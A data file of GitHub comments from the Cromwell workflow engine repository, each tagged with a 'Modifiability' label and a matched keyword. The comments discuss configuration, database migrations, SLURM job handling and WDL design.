slick.basic.BasicBackend$DatabaseDef$$anon$2.run(BasicBackend.scala:275); 	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1149); 	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624); 	at java.lang.Thread.run(Thread.java:748); Caused by: liquibase.exception.DatabaseException: Unknown column ':causedBy[]' in 'field list' [Failed SQL: INSERT INTO METADATA_ENTRY (WORKFLOW_EXECUTION_UUID, METADATA_KEY, CALL_FQN, JOB_SCATTER_INDEX, JOB_RETRY_ATTEMPT, METADATA_TIMESTAMP); SELECT t1.WORKFLOW_EXECUTION_UUID, CONCAT(TRIM(TRAILING ':message' FRO",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4606#issuecomment-459609701:3642,Enhance,EnhancedSqlDatabase,3642,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4606#issuecomment-459609701,1,['Enhance'],['EnhancedSqlDatabase']
Modifiability,"YAML claims to be a superset of JSON, but it is not (as this proves). Every time I have encountered YAML in a project it has been a headache, just my 2c. It is a strange syntax, with the potential for infinite recursion and bombs. It makes for a hard parser implementation, and there have been security and perfomance issues in the past. Fine for local configuration files, but probably not a good idea for any public facing APIs.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3487#issuecomment-379600556:353,config,configuration,353,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3487#issuecomment-379600556,1,['config'],['configuration']
Modifiability,"Yeah - It would be great to play within actors but I'm not sure how much of that's really possible within a shutdown hook. Here are replies to your bullets:; - The JVM shutdown API only takes a Thread, not a Future, so we don't really have a choice what to give it. I could use Scala's ShutdownHookThread if you like but I don't think there's anything like a Future available.; - This doesn't actually block the actor. All that happens in the actor is that the shutdown hook gets configured.; - I agree actors would be nice but delaying shutdown is inherently synchronous - since as soon as that thread returns then the JVM will disappear. If there's another way to get the current state other than my 'done' variable that might be nice though. Do you know of one?. All that's just AFAIK though. Am I missing anything?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/397#issuecomment-173748643:480,config,configured,480,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/397#issuecomment-173748643,2,"['config', 'variab']","['configured', 'variable']"
Modifiability,Yeah I thought about that too. A config flag might be a good safety net.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/305#issuecomment-161013035:33,config,config,33,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/305#issuecomment-161013035,1,['config'],['config']
Modifiability,"Yeah I thought it was weird too, I don't have it in any of my container configs. - `${script} is your full path, eg: `/Users/michael/path/to/execution/PIPELINE_NAME/<guid>/execution,; - `{docker_script}` is rebased from execution as `/cromwell-execution/PIPELINE_NAME/<guid>/execution`",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5784#issuecomment-677038991:72,config,configs,72,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5784#issuecomment-677038991,1,['config'],['configs']
Modifiability,"Yeah from an end user POV it is still a pain not to have a file bundle; concept, and it is something I wish we had at the WDL level. On Sat, Feb 16, 2019 at 9:32 AM Jeff Gentry <notifications@github.com>; wrote:. > I would agree w/ @patmagee <https://github.com/patmagee> that this is a; > matter for the OpenWDL group. Any Cromwell-level constructs to get at the; > underlying functionality would require non-portable WDLs to be written.; > I'll tag @cjllanwarne <https://github.com/cjllanwarne> in case he has any; > clever ideas on how to express the concept in portable WDL in a less sucky; > way.; >; > I disagree with @patmagee <https://github.com/patmagee> that WDL should; > steer clear of the concept - IMO not doing this in the first place was one; > of the larger mistakes we made in the early days of WDL. Perhaps something; > with Object. We're seeing something similar play out in GA4GH land w/ DRS; > ... the concept of a file bundle seems inescapable and it's not quite the; > same thing as Directory; >; > —; > You are receiving this because you were mentioned.; > Reply to this email directly, view it on GitHub; > <https://github.com/broadinstitute/cromwell/issues/2269#issuecomment-464351564>,; > or mute the thread; > <https://github.com/notifications/unsubscribe-auth/ACnwEyiT-eFgW3NMiY39SRU8MvDG3L6Gks5vOBZpgaJpZM4NZ6CY>; > .; >; -- ; Geraldine A. Van der Auwera, Ph.D.; Associate Director of Outreach and Communications; Data Sciences Platform; Broad Institute",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2269#issuecomment-464373736:410,portab,portable,410,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2269#issuecomment-464373736,2,['portab'],['portable']
Modifiability,"Yeah, a github-based scan of the code just now does make me think that this is a workflow-level slowdown, which again is total crap if you're the only workflow in the system. I don't know why only 3k wide would manifest here though, I've run things 200k wide and not seen a problem in this spot, and I don't think the processing here would be a function of the inputs/outputs/etc . What I was getting at with the single vs multi-workflow thing though is that many of the cases like this that I've seen the solution is to parallelize the operation, but in a system running thousands of workflows you don't just want to spam a ton of threads to do this as you'll choke out everyone else. In contrast if you're a single workflow on an n-core box you'd want to use as many cores as you can for this. In the general case I don't know how to resolve that other than to set up a special execution context for these sorts of things, default them to having a a bunch of CPU and then letting someone like firecloud configure that down. That said, in this particular area we've previously seen some highly inefficient copying/comparisons going on so that's also a possible culprit here.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1938#issuecomment-276963200:1005,config,configure,1005,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1938#issuecomment-276963200,1,['config'],['configure']
Modifiability,"Yeah, it was probably lost in the back & forth on that thread but IIRC the numbers were minimums which could be increased by configuration",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/2291#issuecomment-303434488:125,config,configuration,125,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/2291#issuecomment-303434488,1,['config'],['configuration']
Modifiability,"Yeah, it's definitely easier to get rolling. I found pretty quickly in Centaur that I was rolling my own extensions to Ficus (typeclasses IIRC?) which seemed to defeat the point. I switched to configs as it gives you more stuff out of the box. The monad returns I've both enjoyed and shaken my fist at depending on the situation. I liked these two better than any of the rest I saw. . I didn't look at the PR but if you didn't need to do any extensions I suppose it doesn't matter for now. . Edit: To be clear, ""I suppose it doesn't matter"" means ""carry on"", ficus was definitely easier to use until I found myself making custom typeclasses and wondering if i should stick them in Lenthall.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/1554#issuecomment-252431037:193,config,configs,193,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/1554#issuecomment-252431037,1,['config'],['configs']
Modifiability,"Yeah, that's what I""m thinking. Sorry I should have picked up on that when you posted the config block earlier but I was getting confused between the various config file types. Also my mind still tries to think in terms of `zone` and not `region` in terms of Cromwell settings :)",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4974#issuecomment-493273965:90,config,config,90,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4974#issuecomment-493273965,2,['config'],['config']
Modifiability,"Yes -- this is an excellent idea! Let's make it so. -------------------------------; Kristian Cibulskis; Chief Architect, Data Sciences & Data Engineering; Broad Institute of MIT and Harvard; kcibul@broadinstitute.org. On Fri, Dec 16, 2016 at 10:18 PM, Jeff Gentry <notifications@github.com>; wrote:. > That's not currently possible, but IMO it's a good idea.; >; > @kcibul <https://github.com/kcibul> what do you think about having a JES; > configuration setting for the default zone(s) for jobs? Currently it's just; > hardwired to us-central1-b; >; > —; > You are receiving this because you were mentioned.; > Reply to this email directly, view it on GitHub; > <https://github.com/broadinstitute/cromwell/issues/1795#issuecomment-267739604>,; > or mute the thread; > <https://github.com/notifications/unsubscribe-auth/ABW4g0FHRjUSCxRbTRcCYsMvaZwaa1mZks5rI1SAgaJpZM4LPeJB>; > .; >",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1795#issuecomment-267739748:442,config,configuration,442,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1795#issuecomment-267739748,1,['config'],['configuration']
Modifiability,"Yes that's correct, sorry I didn't see you are building from a docker uri. . I don't think there exists the exact functionality you want, but we are getting there. The current cache support is for docker layers, which will save you download time, but you still would rebuild from them each time. I think it would be worth the effort to ask for what you need. Take a look at the [latest release](https://github.com/sylabs/singularity/releases) that has some support for caching (for library images). Then I would open an issue and say something about it - you want the same caching but for docker pulled containers. This particular flow to pull (or build) and honor a cached image if it exists is very common and reasonable, and should be supported.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4635#issuecomment-463867477:204,layers,layers,204,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4635#issuecomment-463867477,1,['layers'],['layers']
Modifiability,Yes this PR is tests only: adding tests for our Nirvana image and updating the existing tests to test what's actually in production (for historical reasons it was testing a config that didn't actually make it to production). The [firecloud-develop](https://github.com/broadinstitute/firecloud-develop/pull/3194) PR is what actually would actually update Cromwell in Terra for the Nirvana reference image.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6975#issuecomment-1382262931:173,config,config,173,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6975#issuecomment-1382262931,1,['config'],['config']
Modifiability,"Yes, I also think dead letters message is no issue. . root@d0ef87b8b6b8:/cromwell-executions/PreProcessingForVariantDiscovery_GATK4/7ffcdf28-2324-4c07-8e87-926a150334d9/call-SamToFastqAndBwaMem/shard-0/execution# **cat stderr**; > Picked up _JAVA_OPTIONS: -Djava.io.tmpdir=/cromwell-executions/PreProcessingForVariantDiscovery_GATK4/7ffcdf28-2324-4c07-8e87-926a150334d9/call-SamToFastqAndBwaMem/shard-0/execution/tmp.rmIqEe; > ERROR StatusLogger No log4j2 configuration file found. Using default configuration: logging only errors to the console.; > [M::bwa_idx_load_from_disk] read 0 ALT contigs; > [W::main_mem] when '-p' is in use, the second query file is ignored.; > . stdout is 0 byte. I'm running on local machine. ; Just I used 2 bam file only.; $ /BiO/Project/brandon-genome-analysis/data/NA12878_24RG_small.txt; /BiO/Project/brandon-genome-analysis/data/HJYFJ.4.NA12878.downsampled.query.sorted.unmapped.bam; /BiO/Project/brandon-genome-analysis/data/HJYFJ.5.NA12878.downsampled.query.sorted.unmapped.bam. I found some issue in stderr file. > Picked up _JAVA_OPTIONS: -Djava.io.tmpdir=/cromwell-executions/PreProcessingForVariantDiscovery_GATK4/7ffcdf28-2324-4c07-8e87-926a150334d9/call-SamToFastqAndBwaMem/shard-0/execution/tmp.rmIqEe; > ERROR StatusLogger No log4j2 configuration file found. Using default configuration: logging only errors to the console. Could you suggest any comment for this ?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3269#issuecomment-367256315:456,config,configuration,456,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3269#issuecomment-367256315,4,['config'],['configuration']
Modifiability,"Yes, I am using Cromwell on SLURM. The significant changes since the completed pull request for the SLURM configuration have been; 1. addition of `script-epilogue = """"` to eliminate the sync behavior after completing tasks. Sync caused some jobs to wait beyond their runtime limits for the sync to complete. ; 2. `concurrent-job-limit` to limit number of jobs submitted to scheduler. The HMS staff will kill all jobs if you submit lots (many hundreds?) of jobs that complete too quickly (<1min) because this creates a bottleneck at the scheduler. `concurrent-job-limit` obviates the need to substantially rewrite the workflow, and in my case contention with other users usually limits the number of compute nodes available more than `concurrent-job-limit`. . #1499 was a problem during pipeline development, and as a result I use very generous runtime limits for all jobs.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1750#issuecomment-328217401:106,config,configuration,106,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1750#issuecomment-328217401,2,"['config', 'rewrite']","['configuration', 'rewrite']"
Modifiability,"Yes, that's a valid alternative approach @notestaff. The tradeoff here is that by using the environment variables, no additional permissions are required for the process running Cromwell. By using an S3 bucket, we gain the ability of unlimited output size, but also increase the amount of configuration and permissions required to successfully run Cromwell. I think a good enhancement would be to add the ability to pass these things through S3 and let the user decide which mechanism and tradeoffs they would like. This said, removing the need for AWS_CROMWELL_OUTPUTS_GZ doesn't actually solve the 8k limit issue. In the testing for haplotype caller, some of the commands **themselves** are larger than 8k, even without considering environment variables. So, regardless of the environment variable compression, some solution is still needed for command text compression. I plan to file a couple PRs on the ECS Agent repo to get the conversation started with ECS and AWS Batch service teams on the limit and the mechanism being used to pass data between the services.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4216#issuecomment-427590325:104,variab,variables,104,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4216#issuecomment-427590325,5,"['config', 'enhance', 'variab']","['configuration', 'enhancement', 'variable', 'variables']"
Modifiability,"You're my saviour @grsterin. . Tbh, this feels like one of those ""how did this ever work"" moments. I think I was using a weird custom build of cromwell-49 + some changes, I tested with a fresh copy and you're right it wouldn't work with cromwell-50, but having the wrong key I don't know what I did. I _think_ I got confused because I was primarily looking at the [Configuring#local-filesystem-options](https://cromwell.readthedocs.io/en/stable/Configuring/#local-filesystem-options) page on the docs. I've created a PR with a change which I think help clarifies it: https://github.com/broadinstitute/cromwell/pull/5542. Again, thanks so much, I'm so glad to close this.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5533#issuecomment-642392908:365,Config,Configuring,365,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5533#issuecomment-642392908,2,['Config'],['Configuring']
Modifiability,Your config most likely needs an update to remove usage of the `languages.cwl.CwlV1_0LanguageFactory` class referenced in the exception.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/7247#issuecomment-1927394538:5,config,config,5,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7247#issuecomment-1927394538,1,['config'],['config']
Modifiability,"Your latest commit _might_ be failing because it's logging to stdout while conformance tests only allow logging to stderr. There are lots of `Extra data: line 1 column 3 - line 18 column 1 (char 2 - 1091)` in the travis logs for Local conformance tests. Someday one of us will get the hang of logback and we can just ""easily"" [switch from stdout to stderr](https://stackoverflow.com/questions/25935326/how-can-i-configure-logback-conf-to-send-all-messages-to-stderr). For now I don't have any quick fixes for logging w/ our existing slf4j framework. `Console.err.println()` would work, but isn't pretty either.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/3627#issuecomment-389337148:412,config,configure-logback-conf-to-send-all-messages-to-stderr,412,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/3627#issuecomment-389337148,1,['config'],['configure-logback-conf-to-send-all-messages-to-stderr']
Modifiability,"Yup, thanks. I never circled back to update this. 😄 It actually was being set but not quite correctly and also some environment variables aren't quite right, that's still WIP.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3208#issuecomment-361771938:128,variab,variables,128,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3208#issuecomment-361771938,1,['variab'],['variables']
Modifiability,"[2019-01-17 12:34:15,18] [info] DispatchedConfigAsyncJobExecutionActor [ESC[38;5;2mf2e0c573ESC[0malignment_to_rec:NA:1]: Status change from - to Running; [2019-01-17 12:34:16,27] [ESC[38;5;220mwarnESC[0m] DispatchedConfigAsyncJobExecutionActor [ESC[38;5;2mf2e0c573ESC[0malignment_to_rec:NA:1]: Fatal exception polling for status. Job will fail.; java.util.concurrent.ExecutionException: Boxed Error; at scala.concurrent.impl.Promise$.resolver(Promise.scala:83); at scala.concurrent.impl.Promise$.scala$concurrent$impl$Promise$$resolveTry(Promise.scala:75); at scala.concurrent.impl.Promise$KeptPromise$.apply(Promise.scala:402); at scala.concurrent.Promise$.fromTry(Promise.scala:138); at scala.concurrent.Future$.fromTry(Future.scala:635); at cromwell.backend.standard.StandardAsyncExecutionActor.pollStatusAsync(StandardAsyncExecutionActor.scala:691); at cromwell.backend.standard.StandardAsyncExecutionActor.pollStatusAsync$(StandardAsyncExecutionActor.scala:691); at cromwell.backend.impl.sfs.config.DispatchedConfigAsyncJobExecutionActor.pollStatusAsync(ConfigAsyncJobExecutionActor.scala:211); at cromwell.backend.standard.StandardAsyncExecutionActor.poll(StandardAsyncExecutionActor.scala:983); at cromwell.backend.standard.StandardAsyncExecutionActor.poll$(StandardAsyncExecutionActor.scala:977); at cromwell.backend.impl.sfs.config.DispatchedConfigAsyncJobExecutionActor.poll(ConfigAsyncJobExecutionActor.scala:211); at cromwell.backend.async.AsyncBackendJobExecutionActor.$anonfun$robustPoll$1(AsyncBackendJobExecutionActor.scala:76); at cromwell.core.retry.Retry$.withRetry(Retry.scala:38); at cromwell.backend.async.AsyncBackendJobExecutionActor.withRetry(AsyncBackendJobExecutionActor.scala:61); at cromwell.backend.async.AsyncBackendJobExecutionActor.cromwell$backend$async$AsyncBackendJobExecutionActor$$robustPoll(AsyncBackendJobExecutionActor.scala:76); at cromwell.backend.async.AsyncBackendJobExecutionActor$$anonfun$receive$1.applyOrElse(AsyncBackendJobExecutionActor.scala:89); at",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4560#issuecomment-455621345:1818,config,config,1818,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4560#issuecomment-455621345,1,['config'],['config']
Modifiability,"[File] inputBams; String outputBam. command {; echo ""dummy marking duplicates""; touch ${outputBam}; }. output {; File markDupedBam = ""${outputBam}""; }; }; ```; running:; ```; java -jar workspace/cromwell/target/scala-2.11/cromwell-24-5155e6f-SNAP.jar run scatterTest.wdl - - - -; ```. succeeds but running with new version: ; ```; java -jar workspace/cromwell/target/scala-2.11/cromwell-24-340a5cf-SNAP.jar run scatterTest.wdl - - - -; ```. consistently (repeatably) dies with:; ```; [2016-12-21 13:01:37,48] [error] WorkflowManagerActor Workflow 28b55884-8fd1-43aa-92ea-eb4891c2c5ff failed (during ExecutingWorkflowState): Couldn't resolve all inputs for dna_mapping_38.libraryMerge at index Some(0).:; Input evaluation for Call dna_mapping_38.libraryMerge failed.:; 	inputBams:; 	Could not find the shard mapping to this scatter dna_mapping_38.$scatter_1; 	outputBam:; 	Could not find the shard mapping to this scatter dna_mapping_38.$scatter_1; wdl4s.exception.VariableLookupException: Couldn't resolve all inputs for dna_mapping_38.libraryMerge at index Some(0).:; Input evaluation for Call dna_mapping_38.libraryMerge failed.:; 	inputBams:; 	Could not find the shard mapping to this scatter dna_mapping_38.$scatter_1; 	outputBam:; 	Could not find the shard mapping to this scatter dna_mapping_38.$scatter_1; 	at cromwell.engine.workflow.lifecycle.execution.CallPreparationActor$$anonfun$resolveAndEvaluateInputs$1.applyOrElse(JobPreparationActor.scala:49); 	at cromwell.engine.workflow.lifecycle.execution.CallPreparationActor$$anonfun$resolveAndEvaluateInputs$1.applyOrElse(JobPreparationActor.scala:48); 	at scala.runtime.AbstractPartialFunction.apply(AbstractPartialFunction.scala:36); 	at scala.util.Failure.recoverWith(Try.scala:203); 	at cromwell.engine.workflow.lifecycle.execution.CallPreparationActor.resolveAndEvaluateInputs(JobPreparationActor.scala:48); 	at cromwell.engine.workflow.lifecycle.execution.CallPreparationActor$$anonfun$receive$1.applyOrElse(JobPreparationActor.scala:27",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1802#issuecomment-268422512:2612,Variab,VariableLookupException,2612,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1802#issuecomment-268422512,1,['Variab'],['VariableLookupException']
Modifiability,"[This is intended to make it more portable](https://stackoverflow.com/a/10383546/15114474) . Currently, cromwell couldn't work on NixOS or Guix, for example, see #3201",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/7469#issuecomment-2269754420:34,portab,portable,34,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7469#issuecomment-2269754420,1,['portab'],['portable']
Modifiability,_1 | 	at akka.dispatch.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); 11:09:46 cromwell-test_1 | 	at akka.dispatch.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); 11:09:46 cromwell-test_1 | Caused by: liquibase.exception.LockException: java.lang.NullPointerException; 11:09:46 cromwell-test_1 | 	at liquibase.lockservice.StandardLockService.acquireLock(StandardLockService.java:242); 11:09:46 cromwell-test_1 | 	at liquibase.lockservice.StandardLockService.waitForLock(StandardLockService.java:170); 11:09:46 cromwell-test_1 | 	at liquibase.Liquibase.update(Liquibase.java:196); 11:09:46 cromwell-test_1 | 	at liquibase.Liquibase.update(Liquibase.java:192); 11:09:46 cromwell-test_1 | 	at cromwell.database.migration.liquibase.LiquibaseUtils$.updateSchema(LiquibaseUtils.scala:58); 11:09:46 cromwell-test_1 | 	at cromwell.database.migration.liquibase.LiquibaseUtils$.updateSchema(LiquibaseUtils.scala:31); 11:09:46 cromwell-test_1 | 	at cromwell.services.ServicesStore$EnhancedSqlDatabase$.$anonfun$initialized$1(ServicesStore.scala:11); 11:09:46 cromwell-test_1 | 	at cromwell.services.ServicesStore$EnhancedSqlDatabase$.$anonfun$initialized$1$adapted(ServicesStore.scala:11); 11:09:46 cromwell-test_1 | 	at cromwell.database.slick.SlickDatabase.$anonfun$withConnection$1(SlickDatabase.scala:96); 11:09:46 cromwell-test_1 | 	at slick.jdbc.SimpleJdbcAction.run(StreamingInvokerAction.scala:70); 11:09:46 cromwell-test_1 | 	at slick.jdbc.SimpleJdbcAction.run(StreamingInvokerAction.scala:69); 11:09:46 cromwell-test_1 | 	at slick.basic.BasicBackend$DatabaseDef$$anon$2.liftedTree1$1(BasicBackend.scala:275); 11:09:46 cromwell-test_1 | 	at slick.basic.BasicBackend$DatabaseDef$$anon$2.run(BasicBackend.scala:275); 11:09:46 cromwell-test_1 | 	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1149); 11:09:46 cromwell-test_1 | 	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624); 11:09:46 cromwell-test_1 | 	at java.l,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4328#issuecomment-434037766:4163,Enhance,EnhancedSqlDatabase,4163,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4328#issuecomment-434037766,1,['Enhance'],['EnhancedSqlDatabase']
Modifiability,"_FQN OR (t2.CALL_FQN IS NULL AND t1.CALL_FQN IS NULL)); 	 AND (t2.JOB_SCATTER_INDEX = t1.JOB_SCATTER_INDEX OR (t2.JOB_SCATTER_INDEX IS NULL AND t1.JOB_SCATTER_INDEX IS NULL)); 	 AND (t2.JOB_RETRY_ATTEMPT = t1.JOB_RETRY_ATTEMPT OR (t2.JOB_RETRY_ATTEMPT IS NULL AND t1.JOB_RETRY_ATTEMPT IS NULL)); AND t2.METADATA_KEY LIKE CONCAT(TRIM(TRAILING ':message' FROM t1.METADATA_KEY), "":causedBy[%""); AND t2.METADATA_JOURNAL_ID <> t1.METADATA_JOURNAL_ID; )]; 	at liquibase.changelog.ChangeSet.execute(ChangeSet.java:619); 	at liquibase.changelog.visitor.UpdateVisitor.visit(UpdateVisitor.java:51); 	at liquibase.changelog.ChangeLogIterator.run(ChangeLogIterator.java:79); 	at liquibase.Liquibase.update(Liquibase.java:214); 	at liquibase.Liquibase.update(Liquibase.java:192); 	at cromwell.database.migration.liquibase.LiquibaseUtils$.updateSchema(LiquibaseUtils.scala:62); 	at cromwell.database.migration.liquibase.LiquibaseUtils$.updateSchema(LiquibaseUtils.scala:34); 	at cromwell.services.ServicesStore$EnhancedSqlDatabase$.$anonfun$initialized$1(ServicesStore.scala:11); 	at cromwell.services.ServicesStore$EnhancedSqlDatabase$.$anonfun$initialized$1$adapted(ServicesStore.scala:11); 	at cromwell.database.slick.SlickDatabase.$anonfun$withConnection$1(SlickDatabase.scala:155); 	at slick.jdbc.SimpleJdbcAction.run(StreamingInvokerAction.scala:70); 	at slick.jdbc.SimpleJdbcAction.run(StreamingInvokerAction.scala:69); 	at slick.basic.BasicBackend$DatabaseDef$$anon$2.liftedTree1$1(BasicBackend.scala:275); 	at slick.basic.BasicBackend$DatabaseDef$$anon$2.run(BasicBackend.scala:275); 	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1149); 	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624); 	at java.lang.Thread.run(Thread.java:748); Caused by: liquibase.exception.DatabaseException: Unknown column ':causedBy[]' in 'field list' [Failed SQL: INSERT INTO METADATA_ENTRY (WORKFLOW_EXECUTION_UUID, METADATA_KEY, CALL_FQN, JOB_SCATTER_INDEX, JOB_R",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4606#issuecomment-459609701:3537,Enhance,EnhancedSqlDatabase,3537,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4606#issuecomment-459609701,1,['Enhance'],['EnhancedSqlDatabase']
Modifiability,"_attempts; }. Int modeled_segments_normal_disk = ceil(size(DenoiseReadCountsNormal.denoised_copy_ratios, ""GB"")) + ceil(size(ModelSegmentsNormal.modeled_segments, ""GB"")) + disk_pad; call CallModeledSegments as CallModeledSegmentsNormal {; input:; entity_id = CollectCountsTumor.entity_id,; modeled_segments_input_file = ModelSegmentsNormal.modeled_segments,; load_copy_ratio = load_copy_ratio,; load_allele_fraction = load_allele_fraction,; normal_minor_allele_fraction_threshold = normal_minor_allele_fraction_threshold,; copy_ratio_peak_min_weight = copy_ratio_peak_min_weight,; min_fraction_of_points_in_normal_allele_fraction_region = min_fraction_of_points_in_normal_allele_fraction_region,; gatk4_jar_override = gatk4_jar_override,; gatk_docker = gatk_docker,; mem_gb = mem_gb_for_call_modeled_segments,; disk_space_gb = modeled_segments_normal_disk,; preemptible_attempts = preemptible_attempts; }. # The files from other tasks are small enough to just combine into one disk variable and pass to the normal plotting tasks; Int plot_normal_disk = ref_size + ceil(size(DenoiseReadCountsNormal.standardized_copy_ratios, ""GB"")) + ceil(size(DenoiseReadCountsNormal.denoised_copy_ratios, ""GB"")) + ceil(size(ModelSegmentsNormal.het_allelic_counts, ""GB"")) + ceil(size(ModelSegmentsNormal.modeled_segments, ""GB"")) + disk_pad; call PlotDenoisedCopyRatios as PlotDenoisedCopyRatiosNormal {; input:; entity_id = CollectCountsNormal.entity_id,; standardized_copy_ratios = DenoiseReadCountsNormal.standardized_copy_ratios,; denoised_copy_ratios = DenoiseReadCountsNormal.denoised_copy_ratios,; ref_fasta_dict = ref_fasta_dict,; minimum_contig_length = minimum_contig_length,; gatk4_jar_override = gatk4_jar_override,; gatk_docker = gatk_docker,; mem_gb = mem_gb_for_plotting,; disk_space_gb = plot_normal_disk,; preemptible_attempts = preemptible_attempts; }. call PlotModeledSegments as PlotModeledSegmentsNormal {; input:; entity_id = CollectCountsNormal.entity_id,; denoised_copy_ratios = DenoiseReadCounts",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3618#issuecomment-388871669:15357,variab,variable,15357,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3618#issuecomment-388871669,1,['variab'],['variable']
Modifiability,"`; 2. `Assigned new job execution tokens to the following groups: cd9b05d1: 1`; 3. `executing: squeue -u $(whoami)`; 4. `job id: 3342271`; 5. `Cromwell will watch for an rc file but will *not* double-check whether this job is actually alive (unless Cromwell restarts)`; 6. `Status change from - to Running`; 7. `Status change from Running to Done`; 8. ~~_Nothing_ - the next job is NOT started.~~ (_See my edit below_). I was under the impression through the comment from @kshakir [here](https://github.com/broadinstitute/cromwell/issues/1499#issuecomment-328880929):. > - Currently the mechanism for ""checking if a job is done""-- in tests and main code-- is to look for rc files; > - On restart if the rc file is missing, there's a single extra check to the scheduler to see if the job is alive, by running a external command line process per job. However, when I restart a Cromwell-39 server, it calls the `check-alive` block before it checks for the RC file. It is calling the correct `squeue -j ${jobid}` (as discussed in the [doc: Slurm config](https://cromwell.readthedocs.io/en/stable/backends/SLURM/). For reference this returns:. ```; slurm_load_jobs error: Invalid job id specified; ```; I tried swapping it out for `squeue -u ${user}` (and also `-u $(whoami)`) option that @MatthewMah mentioned [here](https://github.com/broadinstitute/cromwell/issues/1499#issuecomment-328984482) (just to cover my bases) which returns:. ```; JOBID PARTITION NAME USER ST TIME NODES NODELIST(REASON); ```. Cromwell doesn't seem to store the completed results, even though it successfully finds the RC file and marks the (samtools) task as Done, ~~as when I restarted the Cromwell server (after 20 minutes), it performed exactly the same process~~ (although still relevant, see my edit below - needed 30 minutes). ---. **Edit**: _I left the Cromwell server running for 30 minutes and it just randomly started the next job. I don't know if this is related or not, but obviously needed to update my 